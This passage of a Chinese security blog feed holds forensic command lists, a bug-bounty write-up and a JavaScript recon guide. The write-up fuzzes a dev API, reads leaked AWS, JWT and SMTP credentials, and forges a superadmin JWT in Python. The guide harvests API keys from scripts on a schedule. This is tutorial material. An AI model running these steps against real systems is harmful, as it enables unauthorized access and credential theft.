shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">获取文件原始MAC时间<span class="hljs-built_in">stat</span> -c <span class="hljs-string">&quot;%n|%x|%y|%z&quot;</span> target_file | <span class="hljs-built_in">tee</span> -a timeline.log</span><br></code></pre></td></tr></table></figure><ol><li><strong>日志完整性校验</strong></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">创建日志密封点<span class="hljs-built_in">sha256sum</span> /var/log/*.<span class="hljs-built_in">log</span> &gt; $(<span class="hljs-built_in">date</span> +%s).seal</span><br></code></pre></td></tr></table></figure><hr><h3 id="二十、企业级溯源架构"><a href="#二十、企业级溯源架构" class="headerlink" title="二十、企业级溯源架构"></a>二十、企业级溯源架构</h3><ol><li><strong>分布式日志收集</strong></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_"># </span><span class="language-bash">使用rsyslog加密传输<span class="hljs-built_in">echo</span><span class="hljs-string">&quot;*.* @@(o)logserver.example.com:6514&quot;</span> &gt; /etc/rsyslog.d/secure.confsystemctl restart rsyslog</span><br></code></pre></td></tr></table></figure><ol><li><strong>ELK攻击图谱</strong></li></ol><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">event.<span class="hljs-keyword">type</span>:&quot;attack&quot; <span class="hljs-keyword">AND</span> destination.ip:* | graph-tabular neighbor_direction=<span class="hljs-keyword">both</span><br></code></pre></td></tr></table></figure><hr><h3 id="二十一、硬件级取证"><a href="#二十一、硬件级取证" class="headerlink" title="二十一、硬件级取证"></a>二十一、硬件级取证</h3><ol><li><strong>固件提取</strong></li></ol><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs q">flashrom -p linux_spi:<span class="hljs-built_in">dev</span>=/<span class="hljs-built_in">dev</span>/spidev0<span class="hljs-number">.0</span> -r bios.bin<br></code></pre></td></tr></table></figure><ol><li><strong>UEFI安全扫描</strong></li></ol><figure class="highlight fortran"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fortran">CHIPSEC --<span class="hljs-keyword">module</span> <span class="hljs-keyword">common</span>.uefi.s3bootscript<br></code></pre></td></tr></table></figure><hr><h3 id="二十二、移动终端取证"><a href="#二十二、移动终端取证" class="headerlink" title="二十二、移动终端取证"></a>二十二、移动终端取证</h3><ol><li><strong>Android数据提取</strong></li></ol><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">adb shell <span class="hljs-attribute">content</span> query <span class="hljs-attr">--uri</span> <span class="hljs-attribute">content</span>://sms/inbox<br></code></pre></td></tr></table></figure><ol><li><strong>iOS备份解析</strong></li></ol><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">python3 ios_backup_parser.py -<span class="hljs-keyword">b </span><span class="hljs-keyword">backup </span>-o output<br></code></pre></td></tr></table></figure><hr><h3 id="关键操作原则"><a href="#关键操作原则" class="headerlink" title="关键操作原则"></a>关键操作原则</h3><ol><li>\1. <strong>操作前取证</strong>：重要系统执行<code>dd if=/dev/sda of=/evidence/disk.img</code></li><li>\2. <strong>命令可审计</strong>：所有操作记录于<code>script -t 2&gt; timing.log -a session.log</code></li><li>\3. <strong>证据链完整</strong>：使用<code>sha256sum evidence.img &gt; evidence.sha256</code></li><li>\4. <strong>最小干扰原则</strong>：优先使用<code>lsof -nPi +c 0</code>避免写操作</li></ol><blockquote><p>某金融企业实战案例：通过<code>volatility -f mem.dump yarascan -Y &quot;MZ&quot;</code>检测到内存中的无文件攻击，结合<code>tshark -r pcap -Y &quot;dns&quot; -e dns.qry.name</code>发现C2通信，最终溯源至攻击者基础设施。</p></blockquote><hr><p><strong>没有银弹的命令</strong>，真正的溯源能力在于：</p><ul><li>• 对系统底层的深刻理解（<code>strace</code>&#x2F;<code>dtrace</code>）</li><li>• 网络协议的精准解读（<code>tcpdump</code>高级过滤）</li><li>• 日志信息的关联分析（跨设备日志拼接）</li><li>• 攻击者心理的预判（攻击路径重建）</li></ul><blockquote><p>注意：所有命令需在授权环境下测试验证，生产环境调整参数前务必进行沙箱测试。</p></blockquote><p>通过这50个命令的灵活组合，可覆盖90%以上的HW溯源场景。但切记：</p><ol><li>\1. <strong>理解优于记忆</strong>：每个参数的含义比命令本身更重要</li><li>\2. <strong>场景决定工具</strong>：根据实际环境调整命令组合</li><li>\3. <strong>自动化需谨慎</strong>：关键操作必须人工复核</li><li>\4. <strong>法律红线</strong>：所有操作严格遵守《网络安全法》规定</li></ol>]]></content>
    
    
    
    <tags>
      
      <tag>应急溯源</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>404如何继续渗透</title>
    <link href="/2025/06/30/404%E5%A6%82%E4%BD%95%E7%BB%A7%E7%BB%AD%E6%B8%97%E9%80%8F/"/>
    <url>/2025/06/30/404%E5%A6%82%E4%BD%95%E7%BB%A7%E7%BB%AD%E6%B8%97%E9%80%8F/</url>
    
    <content type="html"><![CDATA[<h1 id="从404到获取权限：通过api路由获得生产密钥"><a href="#从404到获取权限：通过api路由获得生产密钥" class="headerlink" title="从404到获取权限：通过api路由获得生产密钥"></a>从404到获取权限：通过api路由获得生产密钥</h1><p><strong>人生教训 #210：</strong>仅仅因为某个东西返回 404 并不意味着它已经<em>死了</em>——有时它只是需要正确的耳语……或精心设计的 cURL。🤯</p><p>我不知道一个简单的 404 会成为我进入生产库的金票。</p><h1 id="🧠-设置：当-Recon-成为现实时"><a href="#🧠-设置：当-Recon-成为现实时" class="headerlink" title="🧠 设置：当 Recon 成为现实时"></a>🧠 设置：当 Recon 成为现实时</h1><p>在 SaaS 平台上进行一些大规模侦察时，我偶然发现了一个未经身份验证的子域：</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts"><span class="hljs-symbol">https:</span><span class="hljs-comment">//api-dev.targetcompany.com</span><br></code></pre></td></tr></table></figure><p>看起来很无聊。我用一些通用路径来探测它：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">/api/v1/users<br>/api/v1/admin<br>/api/v1/config<br></code></pre></td></tr></table></figure><p>一切都回到了 404。或者我是这么想的。</p><p>但是我的爬虫脚本标记了一件奇怪的事情：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">GET</span> /api/v1/<span class="hljs-type">internal</span>/statusResponse: <span class="hljs-number">404</span> <span class="hljs-keyword">Not</span> <span class="hljs-built_in">Found</span> (but <span class="hljs-keyword">with</span> a <span class="hljs-number">500</span>ms delay)<br></code></pre></td></tr></table></figure><h1 id="🔍-深入探讨：冰壶幻影"><a href="#🔍-深入探讨：冰壶幻影" class="headerlink" title="🔍 深入探讨：冰壶幻影"></a>🔍 深入探讨：冰壶幻影</h1><p>我手动点击它：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -i https:<span class="hljs-regexp">//</span>api-dev.targetcompany.com<span class="hljs-regexp">/api/</span>v1<span class="hljs-regexp">/internal/</span>status<br></code></pre></td></tr></table></figure><p>仍然是 404。但标头暴露了它：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs less"><span class="hljs-attribute">x-powered-by</span>: <span class="hljs-attribute">expressx-env</span>: production<br></code></pre></td></tr></table></figure><p>这不是一个开发服务器。这是<em>从 dev 子域</em>公开 prod 配置。</p><h1 id="🕴️-发现阶段：Fuzz-Till-You-Drop"><a href="#🕴️-发现阶段：Fuzz-Till-You-Drop" class="headerlink" title="🕴️ 发现阶段：Fuzz Till You Drop"></a>🕴️ 发现阶段：Fuzz Till You Drop</h1><p>是时候做手术了。</p><p>我沿着小路跑：<code>ffuf  /api/v1/internal/</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ffuf</span> -u https://api-dev.targetcompany.com/api/v1/internal/FUZZ -w wordlist.txt -mc <span class="hljs-number">200</span>,<span class="hljs-number">403</span>,<span class="hljs-number">500</span> -ac<br></code></pre></td></tr></table></figure><ul><li><code>/api/v1/internal/env</code></li><li><code>/api/v1/internal/secrets</code></li><li><code>/api/v1/internal/creds</code></li></ul><p>直到我发送了一个请求：<code>/secrets</code></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl https:<span class="hljs-regexp">//</span>api-dev.targetcompany.com<span class="hljs-regexp">/api/</span>v1<span class="hljs-regexp">/internal/</span>secrets<br></code></pre></td></tr></table></figure><p>响应：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">&#123;  <span class="hljs-string">&quot;aws_key&quot;</span>: <span class="hljs-string">&quot;AKIAIOSFODNN7EXAMPLE&quot;</span>,  <span class="hljs-string">&quot;aws_secret&quot;</span>: <span class="hljs-string">&quot;wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY&quot;</span>,  <span class="hljs-string">&quot;jwt_secret&quot;</span>: <span class="hljs-string">&quot;thisisnotsosecret123&quot;</span>,  <span class="hljs-string">&quot;smtp_user&quot;</span>: <span class="hljs-string">&quot;alerts<span class="hljs-variable">@targetcompany</span>.com&quot;</span>,  <span class="hljs-string">&quot;smtp_pass&quot;</span>: <span class="hljs-string">&quot;SuperSecret123!&quot;</span>&#125;<br></code></pre></td></tr></table></figure><p>这是完全的 prod 凭证泄漏 — 来自<em>一个本应删除</em>但在 404 掩码后面保持开放状态的端点。</p><h1 id="🚀-武器化：从-Leak-到-Pwn"><a href="#🚀-武器化：从-Leak-到-Pwn" class="headerlink" title="🚀 武器化：从 Leak 到 Pwn"></a>🚀 武器化：从 Leak 到 Pwn</h1><p>借助 AWS 信誉，我验证了访问权限：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">aws configure</span><br></code></pre></td></tr></table></figure><p>有效。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">aws iam list-users</span><br></code></pre></td></tr></table></figure><p>完全管理员访问权限。我可以：</p><ul><li>列出 S3 存储桶</li><li>旋转 EC2 实例</li><li>查看日志</li><li>从他们的域发送 SMTP 电子邮件</li></ul><p>使用 ，我伪造了管理员令牌：<code>jwt_secret</code></p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stata">import jwtpayload = &#123;<span class="hljs-string">&quot;user&quot;</span>: <span class="hljs-string">&quot;admin&quot;</span>, <span class="hljs-string">&quot;role&quot;</span>: <span class="hljs-string">&quot;superadmin&quot;</span>&#125;<span class="hljs-keyword">token</span> = jwt.<span class="hljs-keyword">encode</span>(payload, <span class="hljs-string">&quot;thisisnotsosecret123&quot;</span>, algorithm=<span class="hljs-string">&quot;HS256&quot;</span>)<span class="hljs-keyword">print</span>(<span class="hljs-keyword">token</span>)<br></code></pre></td></tr></table></figure><p>用于：</p><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nix">GET <span class="hljs-symbol">/dashboard</span> HTTP<span class="hljs-operator">/</span><span class="hljs-number">1.1</span><span class="hljs-params">Authorization:</span> Bearer <span class="hljs-symbol">&lt;forged_token&gt;</span><br></code></pre></td></tr></table></figure><p>🚫 没有 2FA。无需额外验证。完全访问权限。</p><p>我现在是他们内部门户的管理员。🧹</p><p><a href="https://vip.bdziyi.com/how-i-turned-a-403-forbidden-into-a-goldmine-738cdf1407aa?source=post_page-----cc8ec9c6d063---------------------------------------">我如何将 403 Forbidden 变成金矿 🚀免费链接🎈infosecwriteups.com</a></p><h1 id="📊-根本原因：幽灵端点"><a href="#📊-根本原因：幽灵端点" class="headerlink" title="📊 根本原因：幽灵端点"></a>📊 根本原因：幽灵端点</h1><p>事实证明，这些路由本应在暂存期间删除，但仅在前端被<em>注释掉</em>。<code>/api/v1/internal/*</code></p><p>当路由逻辑失败但端点本身存在时，后端仍然用误导性的 404 暴露它们。</p><p>开发逻辑：</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs kotlin"><span class="hljs-keyword">if</span> (!user) <span class="hljs-keyword">return</span> <span class="hljs-number">404</span>; <span class="hljs-comment">// instead of 403</span><br></code></pre></td></tr></table></figure><h1 id="🖊️-最终-PoC-摘要："><a href="#🖊️-最终-PoC-摘要：" class="headerlink" title="🖊️ 最终 PoC 摘要："></a>🖊️ 最终 PoC 摘要：</h1><p><strong>目标：</strong> <code>https://api-dev.targetcompany.com/api/v1/internal/secrets</code></p><p><strong>使用的技术：</strong>路由泄露 + 误导性 404 + 未经身份验证的访问 + 凭据泄露</p><ul><li>AWS 完全访问权限</li><li>SMTP 欺骗</li><li>JWT 身份验证绕过</li><li>敏感信息泄露</li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>404</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>js的发现和利用</title>
    <link href="/2025/06/30/js%E7%9A%84%E5%8F%91%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8/"/>
    <url>/2025/06/30/js%E7%9A%84%E5%8F%91%E7%8E%B0%E5%92%8C%E5%88%A9%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="漏洞赏金的JavaScript枚举：像专业人士一样揭露隐藏的端点和秘密！"><a href="#漏洞赏金的JavaScript枚举：像专业人士一样揭露隐藏的端点和秘密！" class="headerlink" title="漏洞赏金的JavaScript枚举：像专业人士一样揭露隐藏的端点和秘密！"></a><strong>漏洞赏金的JavaScript枚举：像专业人士一样揭露隐藏的端点和秘密！</strong></h1><p><em>JavaScript 文件绝对是</em> <em>漏洞赏金猎人的</em><strong>金矿</strong>，通常会泄露<strong>隐藏的 API 端点、敏感密钥和管理路径</strong><em>。如果您跳过 JS 枚举，那么您将</em><strong>错过高价值目标和巨额赏金！</strong> <em>💰</em></p><h1 id="1️-在-Target-🎯-上查找-JavaScript-文件"><a href="#1️-在-Target-🎯-上查找-JavaScript-文件" class="headerlink" title="1️ 在 Target 🎯 上查找 JavaScript 文件"></a><em><strong>1️ 在 Target 🎯 上查找 JavaScript 文件</strong></em></h1><blockquote><p><strong>A 通用方法（使用 CLI 工具）</strong></p></blockquote><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs vim"># Get <span class="hljs-keyword">all</span> JavaScript <span class="hljs-keyword">files</span> from <span class="hljs-keyword">a</span> target using gau (GetAllURLs)<br>gau target.<span class="hljs-keyword">com</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;\.js&quot;</span> | tee js_files.txt<br><br># Extract JS <span class="hljs-keyword">file</span> URLs from Wayback Machine<br>waybackurls target.<span class="hljs-keyword">com</span> | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;\.js&quot;</span> | tee js_wayback.txt<br><br># Use katana <span class="hljs-keyword">for</span> fast crawling<br>katana -<span class="hljs-keyword">u</span> https://target.<span class="hljs-keyword">com</span> -jc -<span class="hljs-keyword">silent</span> | tee js_katana.txt<br><br># Combine <span class="hljs-keyword">all</span> JS sources<br><span class="hljs-keyword">echo</span> target.<span class="hljs-keyword">com</span> | subfinder | httpx -<span class="hljs-keyword">silent</span> | gau | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;\.js&quot;</span> | anew all_js.txt<br><br># Extract JS links from robots.txt<br>curl -s https://target.<span class="hljs-keyword">com</span>/robots.txt | <span class="hljs-keyword">grep</span> <span class="hljs-string">&quot;\.js&quot;</span> | awk <span class="hljs-string">&#x27;&#123;print $NF&#125;&#x27;</span> | tee js_robots.txt<br></code></pre></td></tr></table></figure><p><strong>年度方法 ：</strong></p><ol><li><strong>检查 Page Source</strong> （） → 查找标签。<code>Ctrl + U``&lt;script&gt;</code></li><li><strong>使用“网络”选项卡</strong> （） →检查从外部源加载的 JS 文件 （） （）。<code>F12 → Sources</code></li><li><strong>使用 Burp Suite Spidering</strong> 查找隐藏的 JS 文件。</li></ol><h1 id="2️-从JavaScript中提取端点和API密钥"><a href="#2️-从JavaScript中提取端点和API密钥" class="headerlink" title="2️ 从JavaScript中提取端点和API密钥"></a><em><strong>2️ 从JavaScript中提取端点和API密钥</strong></em></h1><blockquote><p><strong>使用 LinkFinder 提取端点</strong></p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> js_files.txt | xargs -I&#123;&#125; python3 ~/tools/LinkFinder/linkfinder.py -i &#123;&#125; -o li | <span class="hljs-built_in">tee</span> endpoints.txt<br></code></pre></td></tr></table></figure><blockquote><p>使用SecretFinder查找API密钥和秘密</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> js_files.txt | xargs -I&#123;&#125; python3 ~/tools/SecretFinder/SecretFinder.py -i &#123;&#125; -o cli | <span class="hljs-built_in">tee</span> secrets.txt<br></code></pre></td></tr></table></figure><blockquote><p>使用 GF （grep 模式） 查找有趣的模式</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> js_files.txt | gf apikeys | <span class="hljs-built_in">tee</span> api_keys.txt<br><span class="hljs-built_in">cat</span> js_files.txt | gf aws-keys | <span class="hljs-built_in">tee</span> aws_keys.txt<br><span class="hljs-built_in">cat</span> js_files.txt | gf json | <span class="hljs-built_in">tee</span> json_leaks.txt<br><span class="hljs-built_in">cat</span> js_files.txt | gf urls | <span class="hljs-built_in">tee</span> urls.txt<br></code></pre></td></tr></table></figure><h1 id="使用-grep-手动搜索敏感数据"><a href="#使用-grep-手动搜索敏感数据" class="headerlink" title="使用 grep 手动搜索敏感数据"></a>使用 grep 手动搜索敏感数据</h1><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">grep <span class="hljs-punctuation">-</span>E <span class="hljs-punctuation">-</span>o <span class="hljs-string">&quot;(apiKey|authToken|client_secret|accessToken)[\&quot;</span>&#x27;= ]+[^\&quot;&#x27; ]<span class="hljs-punctuation">+</span><span class="hljs-string">&quot; js_files.txt | tee found_keys.txt</span><br></code></pre></td></tr></table></figure><h1 id="3️-实现最高效率的链式工具"><a href="#3️-实现最高效率的链式工具" class="headerlink" title="3️ 实现最高效率的链式工具"></a><em><strong>3️ 实现最高效率的链式工具</strong></em></h1><blockquote><p>在一个命令中查找JavaScript文件并提取端点</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gau target.com | grep <span class="hljs-string">&quot;\.js&quot;</span> | <span class="hljs-built_in">tee</span> js_files.txt &amp;&amp; <span class="hljs-built_in">cat</span> js_files.txt | xargs -I&#123;&#125; python3 ~/tools/LinkFinder/linkfinder.py -i &#123;&#125; -o cli | <span class="hljs-built_in">tee</span> endpoints.txt<br></code></pre></td></tr></table></figure><blockquote><p>同时查找JavaScript文件并提取API密钥</p></blockquote><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">gau target.com | <span class="hljs-type">grep</span> <span class="hljs-string">&quot;\.js&quot;</span> | <span class="hljs-type">anew</span> js_files.txt &amp;&amp; cat js_files.txt | <span class="hljs-type">gf</span> apikeys | <span class="hljs-type">tee</span> api_keys.txt<br></code></pre></td></tr></table></figure><blockquote><p>使用多种工具的完整侦察管道</p></blockquote><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">echo target.com | <span class="hljs-type">subfinder</span> | <span class="hljs-type">httpx</span> -silent | <span class="hljs-type">gau</span> | <span class="hljs-type">grep</span> <span class="hljs-string">&quot;\.js&quot;</span> | <span class="hljs-type">anew</span> js_files.txt &amp;&amp; cat js_files.txt | <span class="hljs-type">xargs</span> -I&#123;&#125; python3 ~/tools/LinkFinder/linkfinder.py -i &#123;&#125; -o cli | <span class="hljs-type">tee</span> endpoints.txt &amp;&amp; cat js_files.txt | <span class="hljs-type">gf</span> apikeys | <span class="hljs-type">tee</span> api_keys.txt<br></code></pre></td></tr></table></figure><h1 id="4️-利用提取的端点"><a href="#4️-利用提取的端点" class="headerlink" title="4️ 利用提取的端点"></a><em><strong>4️ 利用提取的端点</strong></em></h1><p>提取 API 端点后，测试它们是否存在漏洞：</p><blockquote><p>测试 API 端点以实现开放访问</p></blockquote><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gauss">cat endpoints.txt | httpx -silent -status-<span class="hljs-built_in">code</span> -<span class="hljs-built_in">title</span> -tech-detect<br></code></pre></td></tr></table></figure><blockquote><p>API 参数的模糊测试（使用 ffuf）</p></blockquote><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ffuf</span> -u https://target.com/FUZZ -w endpoints.txt -mc <span class="hljs-number">200</span> -fs <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure><blockquote><p>测试 IDOR（不安全的直接对象引用）</p></blockquote><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs coq">cat endpoints.txt | <span class="hljs-type">qsreplace</span> <span class="hljs-string">&quot;1234&quot;</span> | <span class="hljs-type">xargs</span> -I&#123;&#125; curl -X GET -H <span class="hljs-string">&quot;Authorization: Bearer invalidtoken&quot;</span> &#123;&#125;<br></code></pre></td></tr></table></figure><blockquote><p>检查开放目录和敏感文件</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> endpoints.txt | ffuf -u https://target.com/FUZZ -w ~/wordlists/directory-list.txt -mc 200<br></code></pre></td></tr></table></figure><h1 id="5️-在-VPS-上自动枚举-JavaScript-（24-7-Recon）"><a href="#5️-在-VPS-上自动枚举-JavaScript-（24-7-Recon）" class="headerlink" title="5️ 在 VPS 上自动枚举 JavaScript （24&#x2F;7 Recon）"></a><em><strong>5️ 在 VPS 上自动枚举 JavaScript （24&#x2F;7 Recon）</strong></em></h1><p>在 VPS 上运行 <strong>cron 作业</strong>以持续监控新的 JavaScript 文件并自动提取密钥。</p><blockquote><p>为 JS 枚举设置 cron 作业</p></blockquote><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c">echo <span class="hljs-string">&quot;0 * * * * gau target.com | grep &#x27;.js&#x27; | anew js_files.txt &amp;&amp; cat js_files.txt | gf apikeys | tee api_keys.txt&quot;</span> <span class="hljs-string">| crontab -</span><br></code></pre></td></tr></table></figure><blockquote><p>接收 API 密钥泄露的 Telegram 通知</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">while</span> <span class="hljs-literal">true</span>; <span class="hljs-keyword">do</span> <span class="hljs-built_in">cat</span> api_keys.txt | notify -bulk; <span class="hljs-built_in">sleep</span> 3600; <span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><blockquote><p>更聪明地破解，而不是更难！</p></blockquote>]]></content>
    
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>centos7-yum源</title>
    <link href="/2025/06/26/centos7-yum%E6%BA%90/"/>
    <url>/2025/06/26/centos7-yum%E6%BA%90/</url>
    
    <content type="html"><![CDATA[<h1 id="yum源备份"><a href="#yum源备份" class="headerlink" title="yum源备份"></a>yum源备份</h1><p><code>cd /etc/yum.repos.d &amp;&amp; mv CentOS-Base.repo CentOS-Base.repo_bk # 如果找不到，看下具体文件名</code></p><h3 id="如果仍然无法更新，删除所有yum源"><a href="#如果仍然无法更新，删除所有yum源" class="headerlink" title="* 如果仍然无法更新，删除所有yum源"></a>* 如果仍然无法更新，删除所有yum源</h3><p><code>rm -rf *.repo</code></p><h1 id="新建yum源"><a href="#新建yum源" class="headerlink" title="新建yum源"></a>新建yum源</h1><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># CentOS-Base.repo</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># The mirror system uses the connecting IP address of the client and the</span><br><span class="hljs-comment"># update status of each mirror to pick mirrors that are updated to and</span><br><span class="hljs-comment"># geographically close to the client.  You should use this for CentOS updates</span><br><span class="hljs-comment"># unless you are manually picking other mirrors.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># If the mirrorlist= does not work for you, as a fall back you can try the </span><br><span class="hljs-comment"># remarked out baseurl= line instead.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#</span><br> <br>[base]<br>name=CentOS-<span class="hljs-variable">$releasever</span> - Base - mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/centos/</span><span class="hljs-variable">$releasever</span><span class="hljs-regexp">/os/</span><span class="hljs-variable">$basearch</span>/<br>        http:<span class="hljs-regexp">//mi</span>rrors.aliyuncs.com<span class="hljs-regexp">/centos/</span><span class="hljs-variable">$releasever</span><span class="hljs-regexp">/os/</span><span class="hljs-variable">$basearch</span>/<br>        http:<span class="hljs-regexp">//mi</span>rrors.cloud.aliyuncs.com<span class="hljs-regexp">/centos/</span><span class="hljs-variable">$releasever</span><span class="hljs-regexp">/os/</span><span class="hljs-variable">$basearch</span>/<br>gpgcheck=<span class="hljs-number">1</span><br>gpgkey=http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/centos/</span>RPM-GPG-KEY-CentOS-<span class="hljs-number">7</span><br> <br><span class="hljs-comment">#released updates </span><br>[updates]<br>name=CentOS-<span class="hljs-variable">$releasever</span> - Updates - mirrors.aliyun.com<br>failovermethod=priority<br>baseurl=http:<span class="hljs-regexp">//mi</span>rrors.aliyun.com<span class="hljs-regexp">/centos/</span><span class="hljs-variable">$releasever</span><span class="hljs-regexp">/updates/</span><span class="hljs-variable">$basearch</span>/<br>        http:<span class="hljs-regexp">//mi</span>rrors.aliyuncs.com<span class="hljs-regexp">/centos/</span><span class="hljs-variable">$releasever</span><span class="hljs-regexp">/updates/</span><span class="hljs-variable">$basearch</span>/<br>        http:<span class="hljs-regexp">//mi</span>rrors.cloud.aliyuncs.com<span class="hljs-regexp">/centos/</span><span class="hljs-variable">$releasever</span><span 